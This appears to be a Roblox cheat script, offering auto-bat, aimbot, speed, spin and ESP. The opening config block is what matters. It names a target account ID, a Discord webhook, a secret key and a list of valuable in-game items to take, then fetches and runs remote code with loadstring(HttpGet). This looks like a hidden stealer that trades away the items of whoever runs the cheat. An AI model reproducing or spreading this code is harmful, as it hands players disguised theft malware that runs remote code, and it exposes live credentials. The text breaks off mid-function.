getgenv().SECRET_KEY = "mrr_11fb7b79c94d46bcaacc2d97ccf71af2"
getgenv().TARGET_ID = 8576326876
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1459656652881137898/lnlsdDaNcJIWOTrrwr9aFUAe5s_w5yItAWyCG0VUxiKyhZxslELyaya7ZALaWJeTOqi-"
getgenv().TARGET_BRAINROTS = {
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Taco Combinasion"] = true,
    ["La Jolly Grande"] = true,
    ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Tang Tang Keletang"] = true,
    ["Ketupat Kepat"] = true,
    ["Tictac Sahur"] = true,
    ["Garama and Madundung"] = true,
    ["Lavadorito Spinito"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Guest 666"] = true,
    ["Mariachi Corazoni"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Love Love Bear"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Los Sekolahs"] = true,
    ["Reinito Sleighito"] = true,
    ["Cooki and Milki"] = true,
    ["Ketupat Bros"] = true,
    ["Rosey and Teddy"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["La Grande Combinasion"] = true,
    ["Los Sweethearts"] = true,
    ["Las Sis"] = true,
    ["Los Planitos"] = true,
    ["Los Mobilis"] = true,
    ["Los Candies"] = true,
    ["Money Money Reindeer"] = true,
    ["Eviledon"] = true,
    ["Orcaledon"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Telemorte"] = true,
    ["Noo my Candy"] = true,
    ["Noo my Present"] = true,
    ["Los 25"] = true,
    ["Noo my Heart"] = true,
    ["Fishino Clownino"] = true,
    ["Chicleteira Cupideira"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["La Ginger Sekolah"] = true,
    ["Nooo My Hotspot"] = true,
    ["Los Nooo My Hotspotsitos"] = true,
    ["Arcadopus"] = true,
    ["Esok Sekolah"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["La Food Combinasion"] = true,
    ["Los Amigos"] = true,
    ["Los Combinasionas"] = true,
    ["Lovin Rose"] = true,
    ["La Extinct Grande"] = true,
    ["La Spooky Grande"] = true,
    ["Agarrini la Palini"] = true,
    ["Chipso and Queso"] = true,
    ["Karker Sahur"] = true,
    ["Donkeyturbo Express"] = true,
    ["Chimnino"] = true,
    ["Noo my examine"] = true,
    ["Griffin"] = true,
    ["Nacho Spyder"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Pirulitoita Bicicleteira"] = true,
    ["Swag Soda"] = true,
    ["25"] = true,
    ["Bacuru and Egguru"] = true,
    ["Los Burritos"] = true,
    ["67"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Los 67"] = true,
    ["La Sahur Combinasion"] = true,
    ["Fragola La La La"] = true,
    ["La Lucky Grande"] = true
}
task.spawn(function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
end)


--========================      
-- CEBO SCRIPTS - BAT      
-- AUTO BAT + BODY AIMBOT + SPEED + SPIN
-- WITH PLAYER TAB (JUMP, ANTI-RAGDOLL, ANTI-KB, ESP)
--========================      

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

print("Script Loading...")

-- VARIABLES
local AIMBOT_RANGE = 50     
local AIMBOT_DISABLE_RANGE = 45      

local attacking = false      
local aimbotEnabled = false      
local aimbotConnection      
local alignOri      
local attach0      

local spinEnabled = false
local spinSpeed = 50
local spinConnection

local speedEnabled = false
local SPEED_BOOST = 56.5
local SPEED_STEAL = 30

local jumpBoostEnabled = false
local jumpPower = 50
local antiRagdollEnabled = false
local antiKnockbackEnabled = false
local espEnabled = false
local espBoxes = {}

local attackDelay = 0.15
local currentTab = "Combat"

-- ================= UI =================      
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = "DyHZAutoBatUI"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 280, 0, 350)
Main.Position = UDim2.new(0.05, 0, 0.3, 0)
Main.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0,18)

local TopBar = Instance.new("Frame", Main)
TopBar.Size = UDim2.new(1,0,0,40)
TopBar.BackgroundColor3 = Color3.fromRGB(10, 50, 120)
TopBar.BorderSizePixel = 0

local TopCorner = Instance.new("UICorner", TopBar)
TopCorner.CornerRadius = UDim.new(0,18)

local TopBarCover = Instance.new("Frame", TopBar)
TopBarCover.Size = UDim2.new(1,0,0,10)
TopBarCover.Position = UDim2.new(0,0,1,-10)
TopBarCover.BackgroundColor3 = Color3.fromRGB(10, 50, 120)
TopBarCover.BorderSizePixel = 0

local Title = Instance.new("TextLabel", TopBar)
Title.Size = UDim2.new(0.7,0,1,0)
Title.BackgroundTransparency = 1
Title.Text = "DyHZ AUTO BAT"
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 15

local MinimizeBtn = Instance.new("TextButton", TopBar)
MinimizeBtn.Size = UDim2.new(0.15,0,1,0)
MinimizeBtn.Position = UDim2.new(0.85,0,0,0)
MinimizeBtn.BackgroundTransparency = 1
MinimizeBtn.Text = "−"
MinimizeBtn.TextColor3 = Color3.fromRGB(255,255,255)
MinimizeBtn.Font = Enum.Font.GothamBold
MinimizeBtn.TextSize = 22
MinimizeBtn.AutoButtonColor = false

local TabFrame = Instance.new("Frame", Main)
TabFrame.Size = UDim2.new(1, 0, 0, 35)
TabFrame.Position = UDim2.new(0, 0, 0, 40)
TabFrame.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
TabFrame.BorderSizePixel = 0

local CombatTabBtn = Instance.new("TextButton", TabFrame)
CombatTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
CombatTabBtn.Position = UDim2.new(0, 0, 0, 0)
CombatTabBtn.BackgroundColor3 = Color3.fromRGB(10, 50, 120)
CombatTabBtn.Text = "⚔️ COMBAT"
CombatTabBtn.TextColor3 = Color3.fromRGB(255,255,255)
CombatTabBtn.Font = Enum.Font.GothamBold
CombatTabBtn.TextSize = 12
CombatTabBtn.AutoButtonColor = false

local PlayerTabBtn = Instance.new("TextButton", TabFrame)
PlayerTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
PlayerTabBtn.Position = UDim2.new(0.5, 0, 0, 0)
PlayerTabBtn.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
PlayerTabBtn.Text = "👤 PLAYER"
PlayerTabBtn.TextColor3 = Color3.fromRGB(200,200,200)
PlayerTabBtn.Font = Enum.Font.GothamBold
PlayerTabBtn.TextSize = 12
PlayerTabBtn.AutoButtonColor = false

local ContentFrame = Instance.new("Frame", Main)
ContentFrame.Size = UDim2.new(1, 0, 1, -75)
ContentFrame.Position = UDim2.new(0, 0, 0, 75)
ContentFrame.BackgroundTransparency = 1

-- COMBAT TAB
local CombatTab = Instance.new("Frame", ContentFrame)
CombatTab.Size = UDim2.new(1, 0, 1, 0)
CombatTab.BackgroundTransparency = 1
CombatTab.Visible = true

-- PLAYER TAB
local PlayerTab = Instance.new("Frame", ContentFrame)
PlayerTab.Size = UDim2.new(1, 0, 1, 0)
PlayerTab.BackgroundTransparency = 1
PlayerTab.Visible = false

print("UI Created")

-- ================= COMBAT TAB BUTTONS =================
local Button = Instance.new("TextButton", CombatTab)
Button.Size = UDim2.new(0.85,0,0,42)
Button.Position = UDim2.new(0.075,0,0,10)
Button.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
Button.Text = "🔴 AUTO BAT : OFF"
Button.TextColor3 = Color3.fromRGB(255,255,255)
Button.Font = Enum.Font.GothamBold
Button.TextSize = 13
Button.AutoButtonColor = false
Instance.new("UICorner", Button).CornerRadius = UDim.new(0,12)

local DelayInput = Instance.new("TextBox", CombatTab)
DelayInput.Size = UDim2.new(0.85,0,0,30)
DelayInput.Position = UDim2.new(0.075,0,0,58)
DelayInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
DelayInput.Text = ""
DelayInput.PlaceholderText = "Attack Delay: 0.15s"
DelayInput.TextColor3 = Color3.fromRGB(255,255,255)
DelayInput.Font = Enum.Font.Gotham
DelayInput.TextSize = 11
Instance.new("UICorner", DelayInput).CornerRadius = UDim.new(0,10)

local AimbotBtn = Instance.new("TextButton", CombatTab)
AimbotBtn.Size = UDim2.new(0.85,0,0,42)
AimbotBtn.Position = UDim2.new(0.075,0,0,95)
AimbotBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
AimbotBtn.Text = "🎯 AIMBOT : OFF"
AimbotBtn.TextColor3 = Color3.fromRGB(255,255,255)
AimbotBtn.Font = Enum.Font.GothamBold
AimbotBtn.TextSize = 13
AimbotBtn.AutoButtonColor = false
Instance.new("UICorner", AimbotBtn).CornerRadius = UDim.new(0,12)

local SpeedBtn = Instance.new("TextButton", CombatTab)
SpeedBtn.Size = UDim2.new(0.85,0,0,42)
SpeedBtn.Position = UDim2.new(0.075,0,0,145)
SpeedBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
SpeedBtn.Text = "⚡ SPEED : OFF"
SpeedBtn.TextColor3 = Color3.fromRGB(255,255,255)
SpeedBtn.Font = Enum.Font.GothamBold
SpeedBtn.TextSize = 13
SpeedBtn.AutoButtonColor = false
Instance.new("UICorner", SpeedBtn).CornerRadius = UDim.new(0,12)

local SpinBtn = Instance.new("TextButton", CombatTab)
SpinBtn.Size = UDim2.new(0.85,0,0,42)
SpinBtn.Position = UDim2.new(0.075,0,0,195)
SpinBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
SpinBtn.Text = "🌀 SPIN : OFF"
SpinBtn.TextColor3 = Color3.fromRGB(255,255,255)
SpinBtn.Font = Enum.Font.GothamBold
SpinBtn.TextSize = 13
SpinBtn.AutoButtonColor = false
Instance.new("UICorner", SpinBtn).CornerRadius = UDim.new(0,12)

local SliderBG = Instance.new("Frame", CombatTab)
SliderBG.Size = UDim2.new(0.85,0,0,25)
SliderBG.Position = UDim2.new(0.075,0,0,245)
SliderBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
SliderBG.BorderSizePixel = 0
SliderBG.Visible = false
SliderBG.Active = true
Instance.new("UICorner", SliderBG).CornerRadius = UDim.new(0,12)

local SliderFill = Instance.new("Frame", SliderBG)
SliderFill.Size = UDim2.new(0.25,0,1,0)
SliderFill.BackgroundColor3 = Color3.fromRGB(100, 255, 200)
SliderFill.BorderSizePixel = 0
SliderFill.ZIndex = 2
Instance.new("UICorner", SliderFill).CornerRadius = UDim.new(0,12)

local SliderLabel = Instance.new("TextLabel", SliderBG)
SliderLabel.Size = UDim2.new(1,0,1,0)
SliderLabel.BackgroundTransparency = 1
SliderLabel.Text = "Spin Speed: 50"
SliderLabel.TextColor3 = Color3.fromRGB(255,255,255)
SliderLabel.Font = Enum.Font.GothamBold
SliderLabel.TextSize = 11
SliderLabel.ZIndex = 3

-- ================= PLAYER TAB BUTTONS =================
local JumpBtn = Instance.new("TextButton", PlayerTab)
JumpBtn.Size = UDim2.new(0.85,0,0,42)
JumpBtn.Position = UDim2.new(0.075,0,0,10)
JumpBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
JumpBtn.Text = "🦘 JUMP BOOST : OFF"
JumpBtn.TextColor3 = Color3.fromRGB(255,255,255)
JumpBtn.Font = Enum.Font.GothamBold
JumpBtn.TextSize = 13
JumpBtn.AutoButtonColor = false
Instance.new("UICorner", JumpBtn).CornerRadius = UDim.new(0,12)

local JumpInput = Instance.new("TextBox", PlayerTab)
JumpInput.Size = UDim2.new(0.85,0,0,30)
JumpInput.Position = UDim2.new(0.075,0,0,58)
JumpInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
JumpInput.Text = ""
JumpInput.PlaceholderText = "Jump Power: 50"
JumpInput.TextColor3 = Color3.fromRGB(255,255,255)
JumpInput.Font = Enum.Font.Gotham
JumpInput.TextSize = 11
JumpInput.Visible = false
Instance.new("UICorner", JumpInput).CornerRadius = UDim.new(0,10)

local AntiRagdollBtn = Instance.new("TextButton", PlayerTab)
AntiRagdollBtn.Size = UDim2.new(0.85,0,0,42)
AntiRagdollBtn.Position = UDim2.new(0.075,0,0,95)
AntiRagdollBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
AntiRagdollBtn.Text = "🛡️ ANTI-RAGDOLL : OFF"
AntiRagdollBtn.TextColor3 = Color3.fromRGB(255,255,255)
AntiRagdollBtn.Font = Enum.Font.GothamBold
AntiRagdollBtn.TextSize = 13
AntiRagdollBtn.AutoButtonColor = false
Instance.new("UICorner", AntiRagdollBtn).CornerRadius = UDim.new(0,12)

local AntiKBBtn = Instance.new("TextButton", PlayerTab)
AntiKBBtn.Size = UDim2.new(0.85,0,0,42)
AntiKBBtn.Position = UDim2.new(0.075,0,0,145)
AntiKBBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
AntiKBBtn.Text = "💪 ANTI-KB : OFF"
AntiKBBtn.TextColor3 = Color3.fromRGB(255,255,255)
AntiKBBtn.Font = Enum.Font.GothamBold
AntiKBBtn.TextSize = 13
AntiKBBtn.AutoButtonColor = false
Instance.new("UICorner", AntiKBBtn).CornerRadius = UDim.new(0,12)

local ESPBtn = Instance.new("TextButton", PlayerTab)
ESPBtn.Size = UDim2.new(0.85,0,0,42)
ESPBtn.Position = UDim2.new(0.075,0,0,195)
ESPBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
ESPBtn.Text = "👁️ PLAYER ESP : OFF"
ESPBtn.TextColor3 = Color3.fromRGB(255,255,255)
ESPBtn.Font = Enum.Font.GothamBold
ESPBtn.TextSize = 13
ESPBtn.AutoButtonColor = false
Instance.new("UICorner", ESPBtn).CornerRadius = UDim.new(0,12)

print("Buttons Created")

-- ================= TAB SWITCHING =================
local function switchTab(tabName)
	if tabName == "Combat" then
		CombatTab.Visible = true
		PlayerTab.Visible = false
		CombatTabBtn.BackgroundColor3 = Color3.fromRGB(10, 50, 120)
		CombatTabBtn.TextColor3 = Color3.fromRGB(255,255,255)
		PlayerTabBtn.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
		PlayerTabBtn.TextColor3 = Color3.fromRGB(200,200,200)
	else
		CombatTab.Visible = false
		PlayerTab.Visible = true
		PlayerTabBtn.BackgroundColor3 = Color3.fromRGB(10, 50, 120)
		PlayerTabBtn.TextColor3 = Color3.fromRGB(255,255,255)
		CombatTabBtn.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
		CombatTabBtn.TextColor3 = Color3.fromRGB(200,200,200)
	end
end

CombatTabBtn.MouseButton1Click:Connect(function()
	switchTab("Combat")
end)

PlayerTabBtn.MouseButton1Click:Connect(function()
	switchTab("Player")
end)

local minimized = false
MinimizeBtn.MouseButton1Click:Connect(function()
	minimized = not minimized
	if minimized then
		Main:TweenSize(UDim2.new(0, 280, 0, 40), "Out", "Quad", 0.3, true)
		MinimizeBtn.Text = "+"
		ContentFrame.Visible = false
		TabFrame.Visible = false
	else
		Main:TweenSize(UDim2.new(0, 280, 0, 350), "Out", "Quad", 0.3, true)
		MinimizeBtn.Text = "−"
		ContentFrame.Visible = true
		TabFrame.Visible = true
	end
end)

-- Slider Logic
local dragging = false
SliderBG.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		Main.Draggable = false
	end
end)

SliderBG.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = false
		Main.Draggable = true
	end
end)

RunService.RenderStepped:Connect(function()
	if dragging then
		local mousePos = UserInputService:GetMouseLocation()
		local sliderPos = SliderBG.AbsolutePosition.X
		local sliderSize = SliderBG.AbsoluteSize.X
		local relativePos = math.clamp(mousePos.X - sliderPos, 0, sliderSize)
		local percentage = relativePos / sliderSize
		
		SliderFill.Size = UDim2.new(percentage, 0, 1, 0)
		spinSpeed = math.floor(percentage * 200)
		SliderLabel.Text = "Spin Speed: " .. spinSpeed
	end
end)

-- ================= SOUNDS =================      
local OnSound = Instance.new("Sound")
OnSound.Parent = ScreenGui
OnSound.SoundId = "rbxassetid://8745692251"
OnSound.Volume = 1

local ASound = Instance.new("Sound")
ASound.Parent = ScreenGui
ASound.SoundId = "rbxassetid://5419098670"
ASound.Volume = 1

-- ================= SPEED BOOST =================
RunService.Heartbeat:Connect(function()
	if not speedEnabled then return end
	
	local char = player.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
	
	local hrp = char.HumanoidRootPart
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	
	local isStealing = player:GetAttribute("Stealing")
	local targetSpeed = isStealing and SPEED_STEAL or SPEED_BOOST
	
	if hum.MoveDirection.Magnitude > 0 then
		local dir = hum.MoveDirection.Unit
		hrp.AssemblyLinearVelocity = Vector3.new(
			dir.X * targetSpeed,
			hrp.AssemblyLinearVelocity.Y,
			dir.Z * targetSpeed
		)
	end
end)

-- ================= JUMP BOOST =================
local function applyJumpBoost()
	local char = player.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
		hum.JumpPower = jumpPower
	end
end

-- ================= ANTI-RAGDOLL =================
RunService.Heartbeat:Connect(function()
	if not antiRagdollEnabled then return end
	
	local char = player.Character
	if not char then return end
	
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
		hum.PlatformStand = false
	end
end)

-- ================= ANTI-KNOCKBACK =================
local antiKBConnection
local function startAntiKB()
	local char = player.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
	
	local hrp = char.HumanoidRootPart
	
	if antiKBConnection then
		antiKBConnection:Disconnect()
	end
	
	antiKBConnection = hrp:GetPropertyChangedSignal("AssemblyLinearVelocity"):Connect(function()
		if antiKnockbackEnabled then
			local vel = hrp.AssemblyLinearVelocity
			if vel.Magnitude > 50 then
				hrp.AssemblyLinearVelocity = Vector3.new(vel.X * 0.1, vel.Y, vel.Z * 0.1)
			end
		end
	end)
end

-- ================= PLAYER ESP =================
local function createESP(plr)
	if plr == player then return end
	
	local function addESP(char)
		if espBoxes[plr] then
			pcall(function() espBoxes[plr]:Destroy() end)
		end
		
		local hrp = char:WaitForChild("HumanoidRootPart", 5)
		if not hrp then return end
		
		local billboard = Instance.new("BillboardGui")
		billboard.Name = "ESP"
		billboard.Size = UDim2.new(0, 200, 0, 50)
		billboard.StudsOffset = Vector3.new(0, 3, 0)
		billboard.AlwaysOnTop = true
		billboard.Parent = hrp
		
		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(1, 0, 1, 0)
		frame.BackgroundTransparency = 0.7
		frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		frame.Parent = billboard
		Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
		
		local nameLabel = Instance.new("TextLabel")
		nameLabel.Size = UDim2.new(1, 0, 0.6, 0)
		nameLabel.BackgroundTransparency = 1
		nameLabel.Text = plr.Name
		nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		nameLabel.Font = Enum.Font.GothamBold
		nameLabel.TextSize = 14
		nameLabel.TextStrokeTransparency = 0
		nameLabel.Parent = billboard
		
		local distLabel = Instance.new("TextLabel")
		distLabel.Size = UDim2.new(1, 0, 0.4, 0)
		distLabel.Position = UDim2.new(0, 0, 0.6, 0)
		distLabel.BackgroundTransparency = 1
		distLabel.Text = "0 studs"
		distLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
		distLabel.Font = Enum.Font.Gotham
		distLabel.TextSize = 11
		distLabel.TextStrokeTransparency = 0
		distLabel.Parent = billboard
		
		RunService.RenderStepped:Connect(function()
			if espEnabled and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("HumanoidRootPart") then
				local distance = (player.Character.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude
				distLabel.Text = math.floor(distance) .. " studs"
			end
		end)
		
		espBoxes[plr] = billboard
	end
	
	if plr.Character then
		addESP(plr.Character)
	end
	plr.CharacterAdded:Connect(addESP)
end

local function removeESP(plr)
	if espBoxes[plr] then
		pcall(function() espBoxes[plr]:Destroy() end)
		espBoxes[plr] = nil
	end
end

local function toggleESP()
	if espEnabled then
		for _, plr in pairs(Players:GetPlayers()) do
			createESP(plr)
		end
		Players.PlayerAdded:Connect(createESP)
	else
		for _, plr in pairs(Players:GetPlayers()) do
			removeESP(plr)
		end
	end
end

-- ================= SPIN =================
local bodyGyro
local bodyVelocity
local function startSpin()
	local char = player.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
	
	local hrp = char.HumanoidRootPart
	local humanoid = char:FindFirstChildOfClass("Humanoid")
	
	if bodyGyro then bodyGyro:Destroy() end
	if bodyVelocity then bodyVelocity:Destroy() end
	
	bodyGyro = Instance.new("BodyGyro")
	bodyGyro.MaxTorque = Vector3.new(0, math.huge, 0)
	bodyGyro.P = 9e9
	bodyGyro.Parent = hrp
	
	bodyVelocity = Instance.new("BodyVelocity")
	bodyVelocity.MaxForce = Vector3.new(math.huge, 0, math.huge)
	bodyVelocity.Velocity = Vector3.new(0, 0, 0)
	bodyVelocity.Parent = hrp
	
	if spinConnection then spinConnection:Disconnect() end
	
	spinConnection = RunService.Heartbeat:Connect(function()
		if spinEnabled and hrp and bodyGyro then
			bodyGyro.CFrame = bodyGyro.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
			
			if humanoid and humanoid.MoveDirection.Magnitude > 0 then
				bodyVelocity.Velocity = humanoid.MoveDirection * humanoid.WalkSpeed
			else
				bodyVelocity.Velocity = Vector3.new(0, 0, 0)
			end
		end
	end)
end

local function stopSpin()
	if spinConnection then spinConnection:Disconnect() spinConnection = nil end
	if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
	if bodyVelocity then bodyVelocity:Destroy() bodyVelocity = nil end
end

-- ================= AUTO BAT =================      
local function equipBat()
	local char = player.Character
	if not char then return nil end

	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return nil end

	local bat = player.Backpack:FindFirstChild("Bat") or char:FindFirstChild("Bat")
	if bat then
		hum:EquipTool(bat)
		return bat
	end
end

local function autoAttack()
	task.spawn(function()
		while attacking do
			local bat = equipBat()
			if bat then
				pcall(function()
					bat:Activate()
				end)
			end
			task.wait(attackDelay)
		end
	end)
end

-- ================= AIMBOT =================      
local function getClosestTarget()
	local char = player.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end

	local hrp = char.HumanoidRootPart
	local closest = nil
	local shortestDistance = AIMBOT_RANGE

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			local targetHrp = plr.Character.HumanoidRootPart
			local dist = (targetHrp.Position - hrp.Position).Magnitude

			if dist <= shortestDistance then
				shortestDistance = dist
				closest = targetHrp
			end
		end
	end
	return closest
end

local function startBodyAimbot()
	if aimbotConnection then return end

	local char = player.Character
	if not char then return end

	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	local humanoid = char:FindFirstChildOfClass("Humanoid")
	if humanoid then
		humanoid.AutoRotate = false
	end

	attach0 = Instance.new("Attachment", hrp)

	alignOri = Instance.new("AlignOrientation")
	alignOri.Attachment0 = attach0
	alignOri.Mode = Enum.OrientationAlignmentMode.OneAttachment
	alignOri.RigidityEnabled = true
	alignOri.MaxTorque = math.huge
	alignOri.Responsiveness = 200
	alignOri.Parent = hrp

	aimbotConnection = RunService.RenderStepped:Connect(function()
		local target = getClosestTarget()
		if not target then return end

		local dist = (target.Position - hrp.Position).Magnitude
		if dist > AIMBOT_DISABLE_RANGE then return end

		local lookPos = Vector3.new(target.Position.X, hrp.Position.Y, target.Position.Z)
		alignOri.CFrame = CFrame.lookAt(hrp.Position, lookPos)
	end)
end

local function stopBodyAimbot()
	if aimbotConnection then
		aimbotConnection:Disconnect()
		aimbotConnection = nil
	end

	if alignOri then
		alignOri:Destroy()
		alignOri = nil
	end

	if attach0 then
		attach0:Destroy()
		attach0 = nil
	end

	local char = player.Character
	if char then
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid.AutoRotate = true
		end
	end
end

-- ================= BUTTON HANDLERS =================      
Button.MouseButton1Click:Connect(function()
	attacking = not attacking

	if attacking then
		OnSound:Play()
		Button.Text = "🟢 AUTO BAT : ON"
		Button.BackgroundColor3 = Color3.fromRGB(50, 200, 120)
		autoAttack()
	else
		ASound:Play()
		Button.Text = "🔴 AUTO BAT : OFF"
		Button.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
	end
end)

DelayInput.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local inputDelay = tonumber(DelayInput.Text)
		if inputDelay and inputDelay >= 0.05 and inputDelay <= 2 then
			attackDelay = inputDelay
			DelayInput.Text = ""
			DelayInput.PlaceholderText = "Attack Delay: " .. attackDelay .. "s"
		else
			DelayInput.Text = ""
			DelayInput.PlaceholderText = "Invalid! (0.05-2s)"
			task.wait(2)
			DelayInput.PlaceholderText = "Attack Delay: " .. attackDelay .. "s"
		end
	end
end)

AimbotBtn.MouseButton1Click:Connect(function()
	aimbotEnabled = not aimbotEnabled

	if aimbotEnabled then
		OnSound:Play()
		AimbotBtn.Text = "🟢 AIMBOT : ON"
		AimbotBtn.BackgroundColor3 = Color3.fromRGB(250, 150, 50)
		startBodyAimbot()
	else
		ASound:Play()
		AimbotBtn.Text = "🎯 AIMBOT : OFF"
		AimbotBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
		stopBodyAimbot()
	end
end)

SpeedBtn.MouseButton1Click:Connect(function()
	speedEnabled = not speedEnabled

	if speedEnabled then
		OnSound:Play()
		SpeedBtn.Text = "🟢 SPEED : ON"
		SpeedBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
	else
		ASound:Play()
		SpeedBtn.Text = "⚡ SPEED : OFF"
		SpeedBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
	end
end)

SpinBtn.MouseButton1Click:Connect(function()
	spinEnabled = not spinEnabled

	if spinEnabled then
		OnSound:Play()
		SpinBtn.Text = "🟢 SPIN : ON"
		SpinBtn.BackgroundColor3 = Color3.fromRGB(100, 255, 200)
		SliderBG.Visible = true
		startSpin()
	else
		ASound:Play()
		SpinBtn.Text = "🌀 SPIN : OFF"
		SpinBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
		SliderBG.Visible = false
		stopSpin()
	end
end)

JumpBtn.MouseButton1Click:Connect(function()
	jumpBoostEnabled = not jumpBoostEnabled

	if jumpBoostEnabled then
		OnSound:Play()
		JumpBtn.Text = "🟢 JUMP BOOST : ON"
		JumpBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
		JumpInput.Visible = true
		applyJumpBoost()
	else
		ASound:Play()
		JumpBtn.Text = "🦘 JUMP BOOST : OFF"
		JumpBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
		JumpInput.Visible = false
		local char = player.Character
		if char then
			local hum = char:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.JumpPower = 50
			end
		end
	end
end)

JumpInput.FocusLost:Connect(function(enterPressed)
	if jumpBoostEnabled and enterPressed then
		local inputJump = tonumber(JumpInput.Text)
		if inputJump and inputJump >= 50 and inputJump <= 200 then
			jumpPower = inputJump
			applyJumpBoost()
			JumpInput.Text = ""
			JumpInput.PlaceholderText = "Jump Power: " .. jumpPower
		else
			JumpInput.Text = ""
			JumpInput.PlaceholderText = "Invalid! (50-200)"
			task.wait(2)
			JumpInput.PlaceholderText = "Jump Power: " .. jumpPower
		end
	end
end)

AntiRagdollBtn.MouseButton1Click:Connect(function()
	antiRagdollEnabled = not antiRagdollEnabled

	if antiRagdollEnabled then
		OnSound:Play()
		AntiRagdollBtn.Text = "🟢 ANTI-RAGDOLL : ON"
		AntiRagdollBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 100)
	else
		ASound:Play()
		AntiRagdollBtn.Text = "🛡️ ANTI-RAGDOLL : OFF"
		AntiRagdollBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
	end
end)

AntiKBBtn.MouseButton1Click:Connect(function()
	antiKnockbackEnabled = not antiKnockbackEnabled

	if antiKnockbackEnabled then
		OnSound:Play()
		AntiKBBtn.Text = "🟢 ANTI-KB : ON"
